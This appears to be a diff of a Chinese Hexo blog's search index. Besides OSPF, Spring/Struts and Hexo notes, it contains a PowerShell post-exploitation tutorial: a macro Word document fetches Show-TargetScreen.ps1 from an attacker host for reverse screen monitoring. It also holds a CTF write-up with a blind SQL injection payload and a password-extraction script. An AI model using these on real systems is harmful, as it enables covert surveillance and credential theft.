@@ -5,25 +5,12 @@
     <url>/2020/03/25/Powershell------%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</url>
     <content><![CDATA[<font face="微软雅黑" size = 5.5 color = blue >
 
-<h2 id="Bind模式："><a href="#Bind模式：" class="headerlink" title="Bind模式："></a><strong>Bind模式：</strong></h2><p>出现下面这种情况</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200325191322855.png" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
+<h2 id="Bind模式："><a href="#Bind模式：" class="headerlink" title="Bind模式："></a><strong>Bind模式：</strong></h2><p>出现下面这种情况<br><img src="https://img-blog.csdnimg.cn/20200325191322855.png" alt="在这里插入图片描述"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">管理员powershell：执行 set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port <span class="number">3333</span></span><br></pre></td></tr></table></figure>
  <a id="more"></a>
-<p>然后在自己的计算机上使用火狐访问目标3333端口，结果如下图：</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
-
-
-
+<p>然后在自己的计算机上使用火狐访问目标3333端口，结果如下图：<br><img src="https://img-blog.csdnimg.cn/20200325191758673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h2 id="Reverse模式"><a href="#Reverse模式" class="headerlink" title="Reverse模式"></a><strong>Reverse模式</strong></h2><p><strong>attacker：</strong></p>
 <p>在这里可以使用创宇的py脚本转发：</p>
 <p><a href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a><br><strong>执行:</strong></p>
@@ -31,54 +18,13 @@
 
 <p>   之后在target执行：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse-IPAddress <span class="number">192.168</span><span class="number">.74</span><span class="number">.1</span> -Port <span class="number">5555</span></span><br></pre></td></tr></table></figure>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p><img src="https://img-blog.csdnimg.cn/20200325192032100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h2 id="使用Powershell-Client"><a href="#使用Powershell-Client" class="headerlink" title="使用Powershell Client"></a>使用Powershell Client</h2><p>以Out-Word.ps1作为演示示例：</p>
 <p>生成word文件:</p>
 <p>PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1<br>PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL”<a href="http://192.168.74.1/Show-TargetScreen.ps1&quot;">http://192.168.74.1/Show-TargetScreen.ps1&quot;</a> -Arguments”Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666”<br>之后将Show-TargetScreen.ps1放在我们的web根目录：</p>
-<p>测试：</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
-
-
-
+<p>测试：<br><img src="https://img-blog.csdnimg.cn/20200325192125861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>开启监听：</p>
-<p>rtcp [master] python rtcp.py l:6666 l:4444<br>当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
-
-
-
-
-
-
+<p>rtcp [master] python rtcp.py l:6666 l:4444<br>当运行开启office宏的word时，我们就可对其屏幕进行监控，如下图：<br><img src="https://img-blog.csdnimg.cn/20200325192133185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 ]]></content>
       <categories>
         <category>后渗透-powershell脚本使用</category>
@@ -310,12 +256,7 @@
 <p><strong>2、邻接关系</strong>：形成邻居关系后，如果两端设备成功交换DD报文和LSA，才建立邻接关系。</p>
 <a id="more"></a>
 <h2 id="二、邻居关系的建立和邻接关系的建立"><a href="#二、邻居关系的建立和邻接关系的建立" class="headerlink" title="二、邻居关系的建立和邻接关系的建立"></a>二、邻居关系的建立和邻接关系的建立</h2><p><strong>邻居关系的建立：</strong><br>收到的hello报文中包含有自己的RID时，就已经是建立了邻居关系。</p>
-<p><strong>邻接关系的建立：</strong></p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191229223935144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>邻接状态建立的七个状态过程：</p>
+<p><strong>邻接关系的建立：</strong><br><img src="https://img-blog.csdnimg.cn/20191229223935144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>邻接状态建立的七个状态过程：</p>
 <p>① <strong>down:</strong> 开始发送hello包前的状态</p>
 <p>② <strong>init</strong>：开始向外发送hello包</p>
 <p>③ <strong>2-way</strong>：接受到了相邻路由器的hello包，并且包中有对方的路由信息，进入2way状态，这个状态中需要做DR/BDR选举，选出DR、BDR</p>
@@ -337,12 +278,7 @@
     <title>JAVAEE 关于spring整合struts2和hibernate(超详细，附带配置文件示例以及整合struts出现的奇葩错误)</title>
     <url>/2020/03/25/JAVAEE%20%E5%85%B3%E4%BA%8Espring%E6%95%B4%E5%90%88struts2%E5%92%8Chibernate(%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%8C%E9%99%84%E5%B8%A6%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%A4%BA%E4%BE%8B%E4%BB%A5%E5%8F%8A%E6%95%B4%E5%90%88struts%E5%87%BA%E7%8E%B0%E7%9A%84%E5%A5%87%E8%91%A9%E9%94%99%E8%AF%AF)/</url>
     <content><![CDATA[<h2 id="一、整合struts2"><a href="#一、整合struts2" class="headerlink" title="一、整合struts2"></a>一、整合struts2</h2><p><strong>要特别注意struts2、hibernate、spring的版本下述方法对于struts2.1、hibernate3.3.2、spring3.0.5有效</strong>(版本不匹配会导致很多问题，卡了俺超长时间)</p>
-<p><strong>遇到下述问题：</strong></p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191230145716685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p><strong>将applicationContext.xml文件复制到src目录下一份即可解决。</strong></p>
+<p><strong>遇到下述问题：</strong><br><img src="https://img-blog.csdnimg.cn/20191230145716685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>将applicationContext.xml文件复制到src目录下一份即可解决。</strong></p>
 <a id="more"></a>
 <p>/WEB-INF/web.xml配置</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line">  &lt;display-name&gt;plane2&lt;/display-name&gt;</span><br><span class="line">  &lt;listener&gt;</span><br><span class="line">    &lt;listener-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">web</span>.<span class="title">context</span>.<span class="title">ContextLoaderListener</span>&lt;/<span class="title">listener</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">listener</span>&gt;</span></span><br><span class="line"><span class="class">  //&lt;<span class="title">context</span>-<span class="title">param</span>&gt;  </span></span><br><span class="line"><span class="class">    //&lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">contextConfigLocation</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;  </span></span><br><span class="line">  //  &lt;param-value&gt;classpath*:config/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line"><span class="comment">//&lt;/context-param&gt;	(默认去/WEB-INF/applicationContext.xml 下找)</span></span><br><span class="line"></span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">ng</span>.<span class="title">filter</span>.<span class="title">StrutsPrepareAndExecuteFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -366,55 +302,15 @@
     <url>/2020/03/25/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%86%85%E7%94%9F%E5%AE%89%E5%85%A8%E8%AF%95%E9%AA%8C%E5%9C%BACTF%E5%A4%BA%E6%97%97%E8%B5%9B%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%89%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>1.easyphp</p>
 <p><img src="https://img-blog.csdnimg.cn/20191026202051685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过观察可以发现img传参base64解码；同样的方法可得index.php源码<br>之后构造序列化。。。。。</p>
-<p>2、calculate1，2</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026202500563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<pre><code>写wp前删掉了脚本，简述下:利用selenium运算公式并结合chromedriver进行10次提交</code></pre><a id="more"></a>
-<p>3、babysql<br>    <figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026202614737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure></p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026202721697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>之后测试admin’orderby 1# 到3，直到4时</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026202821730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>得知列数为3，通过fuzz发现union select可用,且页面返回第二列的内容即用户名，且常规注入不可行。尝试order by盲注,payload=admin’union select 1,2,’c’ order by 3#。发现当字符小于等于密码时，显示2，当大于密码时显示admin。<br>由此写出脚本：</p>
+<p>2、calculate1，2<br><img src="https://img-blog.csdnimg.cn/20191026202500563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    写wp前删掉了脚本，简述下:利用selenium运算公式并结合chromedriver进行10次提交</p>
+<a id="more"></a>
+<p>3、babysql<br>    <img src="https://img-blog.csdnimg.cn/20191026202614737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191026202721697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后测试admin’orderby 1# 到3，直到4时<br><img src="https://img-blog.csdnimg.cn/20191026202821730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得知列数为3，通过fuzz发现union select可用,且页面返回第二列的内容即用户名，且常规注入不可行。尝试order by盲注,payload=admin’union select 1,2,’c’ order by 3#。发现当字符小于等于密码时，显示2，当大于密码时显示admin。<br>由此写出脚本：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.55.43.255:13004/login.php"</span></span><br><span class="line">print(hex(<span class="number">61</span>))</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    end = <span class="number">31</span></span><br><span class="line">    head = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(head - end) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (end + head) // <span class="number">2</span></span><br><span class="line">        print(mid)</span><br><span class="line">        data1 = flag + chr(mid)</span><br><span class="line">        print(data1)</span><br><span class="line">        sql = <span class="string">"admin'union select 1,2,0x&#123;&#125; order by 3#"</span>.format(data1.encode(<span class="string">"hex"</span>))</span><br><span class="line">        s = requests.session()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: sql,</span><br><span class="line">            <span class="string">'passwd'</span>: <span class="string">'admin'</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(sql)</span><br><span class="line">        result = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            head = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line"></span><br><span class="line">    flag = flag + chr(end)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'flag:'</span> + flag)</span><br><span class="line">print(<span class="string">"flag:"</span> + flag)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026203753392.png" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>这里要注意大小写，因为MySQL比较大小时是不区分的。<br>最后一位是d，因为最后一位时就是正确的admin的passwd应该往后取一位</p>
-<p>4、best_language</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026204002208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>进来就是代码审计，第一个点：提交%s即可绕过<br>第二个点：传参时第一个参数为first=’u’<br>第三个点：变量覆盖，查找参数为数组的变量覆盖的函数，发现了extract。<br>随即传参，可以由文件包含得到class.php源码。</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026204327238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>上来看到前两行，PHP_SESSION_UPLOAD_PROGRESS的利用<br>构造表单，抓包改参数。<br>代码大致意思由Monitor反序列化触发Welcome的__toString魔术方法，接着用到Come的execute方法，有个substr的waf还是好绕的，/…./即可。</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026204700253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>熟悉的flag，之后利用之前的文件包含获取flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191026203753392.png" alt="在这里插入图片描述"><br>这里要注意大小写，因为MySQL比较大小时是不区分的。<br>最后一位是d，因为最后一位时就是正确的admin的passwd应该往后取一位</p>
+<p>4、best_language<br><img src="https://img-blog.csdnimg.cn/20191026204002208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进来就是代码审计，第一个点：提交%s即可绕过<br>第二个点：传参时第一个参数为first=’u’<br>第三个点：变量覆盖，查找参数为数组的变量覆盖的函数，发现了extract。<br>随即传参，可以由文件包含得到class.php源码。<br><img src="https://img-blog.csdnimg.cn/20191026204327238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上来看到前两行，PHP_SESSION_UPLOAD_PROGRESS的利用<br>构造表单，抓包改参数。<br>代码大致意思由Monitor反序列化触发Welcome的__toString魔术方法，接着用到Come的execute方法，有个substr的waf还是好绕的，/…./即可。<br><img src="https://img-blog.csdnimg.cn/20191026204700253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>熟悉的flag，之后利用之前的文件包含获取flag。</p>
 <p>5.easy_encode</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20191026204829219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-<p>看到102 且大部分在127下。尝试了ascii编码转换，得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20191026204829219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到102 且大部分在127下。尝试了ascii编码转换，得到flag</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -425,12 +321,7 @@
     <url>/2020/03/25/hexo%207.7%20%E7%89%88%E6%9C%AC%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%B7%E5%BC%8F%E6%96%87%E4%BB%B6%E5%A4%B1%E6%95%88/</url>
     <content><![CDATA[<p>**</p>
 <h2 id="由于版本升级失效的文件，可以通过自定义加引用的方式："><a href="#由于版本升级失效的文件，可以通过自定义加引用的方式：" class="headerlink" title="由于版本升级失效的文件，可以通过自定义加引用的方式："></a>由于版本升级失效的文件，可以通过自定义加引用的方式：</h2><p>**</p>
-<p>没有custom.styl文件<br>可以自行创建</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20200107104801342.png" alt="在这里插入图片描述" title="" class="">
-                <p>在这里插入图片描述</p>
-            </figure>
-
+<p>没有custom.styl文件<br>可以自行创建<br><img src="https://img-blog.csdnimg.cn/20200107104801342.png" alt="在这里插入图片描述"></p>
 <p>然后在~\themes\next-reloaded\source\css的main.styl文件末尾加入引用<br>//My Layer<br>//————————————————–<br>@import “_custom/custom.styl”;</p>
 ]]></content>
       <categories>
